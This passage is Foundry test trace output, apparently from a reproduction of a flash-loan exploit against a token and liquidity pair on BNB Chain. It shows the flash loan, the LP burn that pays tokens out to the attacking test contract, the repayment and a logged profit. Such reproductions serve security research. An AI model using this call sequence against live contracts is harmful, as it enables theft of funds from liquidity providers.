    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 68407320341664334456519 [6.84e22]
    │   │   │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 3857477335848902199199240 [3.857e24]
    │   │   │   │   │   ├─ [354] 0xB018B22b54AD66B4D369082d394076DaC327ACbA::feeTo() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: 0x0000000000000000000000000000000000000000, value: 326210646094973827472 [3.262e20])
    │   │   │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 43591605278475965483 [4.359e19])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 43591605278475965483 [4.359e19])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [28413] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2458123320064860626326 [2.458e21])
    │   │   │   │   │   │   ├─ [4075] 0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9::userRewardInfo(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000056bc75e2d631000000000000000000000000000000000000000000000000000056bc75e2d6310000000000000000000000000000000000000000000000000001043561a88293000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2458123320064860626326 [2.458e21])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 68363728736385858491036 [6.836e22]
    │   │   │   │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 3855019212528837338572914 [3.855e24]
    │   │   │   │   │   ├─ emit Sync(reserve0: 68363728736385858491036 [6.836e22], reserve1: 3855019212528837338572914 [3.855e24])
    │   │   │   │   │   ├─ emit Burn(sender: 0x8228A4aD192d5D82189afd6e194f65edb8c76a41, amount0: 43591605278475965483 [4.359e19], amount1: 2458123320064860626326 [2.458e21], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   └─ ← [Return] 43591605278475965483 [4.359e19], 2458123320064860626326 [2.458e21]
    │   │   │   │   └─ ← [Return] 43591605278475965483 [4.359e19], 2458123320064860626326 [2.458e21]
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [607] 0xE814Cc2B4DbFe652C04f2E008ced18875c76F510::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 2458123320064860626326 [2.458e21]
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x92b7807bF19b7DDdf89b706143896d05228f3121, 4750475000000000000000000 [4.75e24])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x92b7807bF19b7DDdf89b706143896d05228f3121, value: 4750475000000000000000000 [4.75e24])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x92b7807bF19b7DDdf89b706143896d05228f3121) [staticcall]
    │   │   └─ ← [Return] 16097395824501522838601458 [1.609e25]
    │   ├─ [1296] 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d::balanceOf(0x92b7807bF19b7DDdf89b706143896d05228f3121) [staticcall]
    │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(0x92b7807bF19b7DDdf89b706143896d05228f3121) [delegatecall]
    │   │   │   └─ ← [Return] 7099202292482238571175528 [7.099e24]
    │   │   └─ ← [Return] 7099202292482238571175528 [7.099e24]
    │   ├─ emit Flash(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 4750000000000000000000000 [4.75e24], param3: 0, param4: 475000000000000000000 [4.75e20], param5: 0)
    │   └─ ← [Stop] 
    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 28937959823595053725574 [2.893e22]
    ├─ emit log_named_decimal_uint(key: "After Profit: ", val: 28937959823595053725574 [2.893e22], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.38s (9.62s CPU time)

Ran 2 test suites in 10.75s (10.67s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
